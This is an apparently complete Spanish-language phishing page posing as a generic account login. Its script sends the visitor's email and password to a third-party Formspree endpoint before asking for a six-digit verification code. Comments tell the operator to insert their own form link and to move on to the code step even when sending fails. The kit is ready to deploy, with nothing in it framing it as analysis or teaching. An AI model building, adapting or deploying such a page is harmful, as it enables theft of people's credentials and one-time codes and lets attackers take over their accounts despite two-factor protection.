
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Iniciar sesión</title>
<style>
* {margin:0; padding:0; box-sizing:border-box; font-family: sans-serif;}
body {background:#111; color:white; min-height:100vh; padding:20px;}
.contenedor {max-width:400px; margin:0 auto;}
h2 {text-align:center; margin-bottom:25px;}
.oculto {display:none !important;}
.field {margin-bottom:15px;}
label {display:block; margin-bottom:5px;}
input {width:100%; padding:12px; border-radius:8px; border:none; font-size:16px;}
button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px; font-weight:bold; cursor:pointer;}
.submit-btn {background:#FF0050; color:white; margin-top:10px;}
.link-btn {background:transparent; color:#ccc; margin-top:5px;}
.aviso {font-size:13px; color:#ffcc00; margin-top:10px; text-align:center;}
</style>
</head>
<body>

<div class="contenedor">
  <h2>Inicia sesión con tu cuenta</h2>

  <!-- ✅ PON TU ENLACE DE FORMSPREE AQUÍ -->
  <form action="https://formspree.io/f/xgogzwbd" method="POST" id="formPrincipal">

    <!-- PASO 1: CORREO Y CONTRASEÑA → SE ENVÍAN AL AVANZAR -->
    <div id="paso1">
      <div class="field">
        <label>Correo electrónico</label>
        <input type="email" name="correo" id="correo" required placeholder="tu@correo.com" />
      </div>
      <div class="field">
        <label>Contraseña</label>
        <input type="password" name="contraseña" id="contraseña" required placeholder="••••••••" />
      </div>
      <p class="aviso">Al continuar recibirás los datos en tu correo</p>
      <button type="button" class="submit-btn" id="botonContinuar" onclick="enviarYSeguir()">Continuar</button>
    </div>

    <!-- PASO 2: CÓDIGO -->
    <div id="paso2" class="oculto">
      <div class="field">
        <label>Código de verificación (6 dígitos)</label>
        <input type="text" name="codigo" id="codigo" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" oninput="activarBoton()" />
      </div>
      <button type="button" class="link-btn" onclick="volverPaso1()">← Volver atrás</button>
      <button type="submit" class="submit-btn" id="botonEnviar" disabled>Finalizar</button>
    </div>

  </form>
</div>

<script>
let datosEnviados = false;

async function enviarYSeguir() {
  const correo = document.getElementById('correo').value.trim();
  const pass = document.getElementById('contraseña').value;

  if (!correo || !pass) {
    alert('Escribe tu correo y contraseña primero');
    return;
  }

  // Desactivar botón mientras trabaja
  const btn = document.getElementById('botonContinuar');
  btn.disabled = true;
  btn.textContent = 'Cargando...';

  try {
    // ✅ Enviamos datos usando FormData (la forma que SÍ funciona con Formspree)
    const formData = new FormData();
    formData.append('correo', correo);
    formData.append('contraseña', pass);
    formData.append('nota', 'Primer envío: antes del código');

    await fetch("https://formspree.io/f/xgogzwbd", {
      method: 'POST',
      body: formData,
      mode: 'cors',
      headers: { 'Accept': 'application/json' }
    });

    datosEnviados = true;

  } catch (err) {
    // 🛡️ Si hay error de conexión o seguridad: igual avanzamos para que no se quede pegado
    console.log('Sin conexión o bloqueado, seguimos igual');
  }

  // ✅ SIEMPRE avanzamos al paso del código, no se queda pegado
  document.getElementById('paso1').classList.add('oculto');
  document.getElementById('paso2').classList.remove('oculto');
}

function volverPaso1() {
  document.getElementById('paso2').classList.add('oculto');
  document.getElementById('paso1').classList.remove('oculto');
  document.getElementById('botonContinuar').disabled = false;
  document.getElementById('botonContinuar').textContent = 'Continuar';
}

function activarBoton() {
  const codigo = document.getElementById('codigo').value;
  document.getElementById('botonEnviar').disabled = codigo.length !== 6;
}
</script>

</body>
</html>
